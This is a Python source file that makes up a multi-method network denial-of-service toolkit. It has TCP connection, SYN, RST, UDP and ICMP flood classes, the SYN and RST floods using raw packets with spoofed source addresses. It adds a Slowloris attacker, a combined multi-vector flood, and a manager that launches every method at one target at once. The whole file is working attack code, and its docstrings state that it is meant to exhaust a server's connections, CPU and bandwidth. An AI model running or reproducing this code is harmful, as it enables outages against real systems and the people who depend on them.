import asyncio, socket, struct, random, time, os, sys
from typing import Dict, List, Optional, Tuple

IS_WINDOWS = sys.platform == "win32"

def _fast_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

class TcpConnectionFlood:
    """TCP Connection Flood - uses regular sockets, works on ALL platforms
    Rapidly opens TCP connections and sends partial HTTP requests.
    This consumes server connection table, CPU, and bandwidth."""
    def __init__(self):
        self.name = "TCP Connection Flood"
        self.sent = 0
        self.failed = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 200, port: int = 0) -> Dict:
        results = {"sent": 0, "failed": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        host = parsed.split(":")[0]
        dst_port = port or (443 if "https" in target else 80)
        if ":" in parsed:
            try: dst_port = int(parsed.split(":")[1])
            except: pass

        async def _connect():
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(ip, dst_port),
                    timeout=5
                )
                # Send partial HTTP request to consume resources
                req = (
                    f"GET /?{random.randint(0,9999999)} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Accept: text/html,application/xhtml+xml\r\n"
                    f"X-Id: {random.randint(0,999999999)}\r\n"
                )
                w.write(req.encode())
                await asyncio.wait_for(w.drain(), timeout=3)
                # Read response slowly to keep connection open
                try:
                    await asyncio.wait_for(r.read(256), timeout=0.5)
                except:
                    pass
                w.close()
                self.sent += 1
                results["sent"] = self.sent
            except:
                self.failed += 1
                results["failed"] = self.failed

        start = time.time()
        batch_size = min(threads, 500)
        while time.time() - start < duration:
            tasks = [asyncio.create_task(_connect()) for _ in range(batch_size)]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        return results

class SynFloodV5:
    """SYN Flood - tries raw socket first, falls back to TCP Connection Flood"""
    def __init__(self):
        self.name = "SYN Flood V5"
        self.sent = 0
        self.failed = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads)
        results = {"sent": 0, "failed": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        port = 80
        if ":" in parsed:
            try: port = int(parsed.split(":")[1])
            except: pass

        async def syn_one(src_port: int):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dst_ip = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    (4 << 4) + 5, 0, 40, random.randint(1, 65535),
                    0, 255, socket.IPPROTO_TCP, 0, src_ip, dst_ip)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, port, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x02,  # SYN flag
                    socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", src_ip, dst_ip, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = _fast_checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, port, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x02,
                    socket.htons(65535), socket.htons(cks), 0)
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                self.failed += 1

        start = time.time()
        while time.time() - start < duration:
            tasks = [syn_one(random.randint(1024, 65535)) for _ in range(min(threads, 200))]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        results["sent"] = self.sent
        results["failed"] = self.failed
        return results

class UdpFloodV5:
    """UDP Flood - works on ALL platforms, optimized with socket reuse"""
    def __init__(self):
        self.name = "UDP Flood V5"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 200) -> Dict:
        results = {"sent": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        port = 80
        if ":" in parsed:
            try: port = int(parsed.split(":")[1])
            except: pass
        if "https" in target and port == 80:
            port = 443

        # Pre-generate random payloads for speed
        payloads = [os.urandom(random.randint(64, 1400)) for _ in range(50)]

        async def _send_batch(sock, batch_size: int):
            try:
                for _ in range(batch_size):
                    payload = random.choice(payloads)
                    sock.sendto(payload, (ip, port))
                    self.sent += 1
                await asyncio.sleep(0)
            except:
                pass

        start = time.time()
        batch = min(threads, 500)
        while time.time() - start < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                tasks = [asyncio.create_task(_send_batch(sock, 50)) for _ in range(batch)]
                await asyncio.gather(*tasks, return_exceptions=True)
                sock.close()
            except:
                pass

        results["sent"] = self.sent
        return results

class IcmpFloodV5:
    """ICMP Flood - requires admin on most platforms"""
    def __init__(self):
        self.name = "ICMP Flood V5"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        results = {"sent": 0, "error": ""}
        if IS_WINDOWS:
            # Fallback to UDP flood on Windows
            return await UdpFloodV5().attack(target, duration, threads)
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results

        async def icmp_one():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                icmp_type = 8
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                payload = os.urandom(random.randint(40, 100))
                header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                cksum = _fast_checksum(header + payload)
                header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(cksum), icmp_id, icmp_seq)
                sock.sendto(header + payload, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        start = time.time()
        while time.time() - start < duration:
            tasks = [icmp_one() for _ in range(min(threads, 100))]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        results["sent"] = self.sent
        return results

class TcpResetFlood:
    """TCP RST Flood - requires admin on most platforms"""
    def __init__(self):
        self.name = "TCP RST Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads)
        results = {"sent": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results

        async def rst_one(src_port: int):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dst_ip = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    (4 << 4) + 5, 0, 40, random.randint(1, 65535),
                    0, 255, socket.IPPROTO_TCP, 0, src_ip, dst_ip)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, 80, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x14,  # RST + ACK
                    socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", src_ip, dst_ip, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = _fast_checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, 80, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x14,
                    socket.htons(65535), socket.htons(cks), 0)
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        start = time.time()
        while time.time() - start < duration:
            tasks = [rst_one(random.randint(1024, 65535)) for _ in range(min(threads, 200))]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        results["sent"] = self.sent
        return results

class SlowLorisV5:
    """Slowloris - keep partial HTTP connections open"""
    def __init__(self):
        self.name = "Slowloris V5"
        self.active = 0

    async def attack(self, target: str, duration: int = 60, connections: int = 300) -> Dict:
        results = {"active_connections": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        host = parsed.split(":")[0]
        port = 443 if "https" in target else 80
        if ":" in parsed:
            try: port = int(parsed.split(":")[1])
            except: pass

        socks = []
        async def open_conn():
            try:
                r, w = await asyncio.open_connection(ip, port)
                w.write(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(['Mozilla/5.0','Chrome/136','Safari/604.1'])}\r\n".encode())
                await w.drain()
                socks.append(w)
                self.active += 1
                return w
            except:
                pass
            return None

        async def keep_alive(writer, end_time):
            while time.time() < end_time:
                try:
                    writer.write(f"X-Keep-Alive: {random.randint(0,999999999)}\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(5, 15))
                except:
                    break

        end = time.time() + duration
        conn_count = min(connections, 500)
        for _ in range(conn_count):
            await open_conn()
            await asyncio.sleep(0.005)

        results["active_connections"] = len(socks)
        if socks:
            keep_tasks = [keep_alive(w, end) for w in socks]
            await asyncio.gather(*keep_tasks, return_exceptions=True)

        for w in socks:
            try: w.close()
            except: pass

        return results


class MultiVectorFlood:
    """Floods target with ALL L4 methods simultaneously"""
    def __init__(self):
        self.name = "Multi-Vector L4 Flood"
        self.stats = {"tcp_sent": 0, "udp_sent": 0, "slowloris": 0}

    async def attack(self, target: str, duration: int = 30, threads: int = 300) -> Dict:
        tcp = TcpConnectionFlood()
        udp = UdpFloodV5()
        slow = SlowLorisV5()

        async def _run_tcp():
            r = await tcp.attack(target, duration, threads // 2)
            self.stats["tcp_sent"] = r.get("sent", 0)

        async def _run_udp():
            r = await udp.attack(target, duration, threads // 2)
            self.stats["udp_sent"] = r.get("sent", 0)

        async def _run_slow():
            r = await slow.attack(target, duration, connections=200)
            self.stats["slowloris"] = r.get("active_connections", 0)

        await asyncio.gather(_run_tcp(), _run_udp(), _run_slow(), return_exceptions=True)
        total = self.stats["tcp_sent"] + self.stats["udp_sent"]
        return {"sent": total, "stats": self.stats}


class L4AttackManager:
    def __init__(self):
        self.methods = {
            "syn": SynFloodV5(),
            "udp": UdpFloodV5(),
            "icmp": IcmpFloodV5(),
            "rst": TcpResetFlood(),
            "slowloris": SlowLorisV5(),
            "tcp_conn": TcpConnectionFlood(),
            "multi": MultiVectorFlood(),
        }

    async def launch_all(self, target: str, duration: int = 30) -> Dict:
        results = {}
        coros = []
        for name, method in self.methods.items():
            if name == "slowloris":
                coros.append((name, method.attack(target, duration=duration, connections=200)))
            elif name == "multi":
                coros.append((name, method.attack(target, duration=duration, threads=300)))
            else:
                coros.append((name, method.attack(target, duration=duration, threads=150)))
        for name, coro in coros:
            try:
                results[name] = await asyncio.wait_for(coro, timeout=duration + 10)
            except Exception as e:
                results[name] = {"error": str(e)}
        return results

    async def probe_all(self, target: str) -> Dict:
        results = {}
        for name in self.methods:
            results[name] = {"available": True, "note": "L4 method"}
        return results
